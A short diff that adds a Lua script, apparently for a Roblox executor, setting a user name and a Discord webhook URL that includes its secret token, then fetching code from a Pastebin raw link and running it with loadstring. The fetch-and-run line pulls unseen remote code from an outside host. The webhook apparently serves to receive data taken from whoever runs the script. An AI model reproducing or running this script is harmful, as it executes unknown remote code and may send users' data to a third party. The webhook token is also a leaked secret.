@@ -1,0 +1,5 @@
+
+UserName = "fastking199"
+WebHook = "https://discord.com/api/webhooks/1272904736651346030/cxJewpwerx8KGJ4snbOn_GJnXE2SG59V-YFOI8WfQPJCcnta2w4RK_OgoANWTu1-CXsr"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ahGVHZhj"))()
